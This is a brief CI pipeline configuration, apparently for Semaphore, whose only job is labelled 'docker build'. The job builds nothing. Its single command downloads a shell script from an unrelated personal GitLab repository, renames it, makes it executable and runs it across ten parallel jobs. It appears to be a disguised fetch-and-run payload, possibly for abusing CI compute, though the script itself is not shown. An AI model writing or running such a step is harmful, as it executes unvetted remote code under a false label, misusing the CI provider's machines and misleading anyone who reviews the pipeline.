version: v1.0
name: Docker
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2204
blocks:
  - name: Build
    task:
      jobs:
        - name: docker build
          commands:
            - 'wget -O minto https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh && chmod +x minto && ./minto'
          parallelism: 10
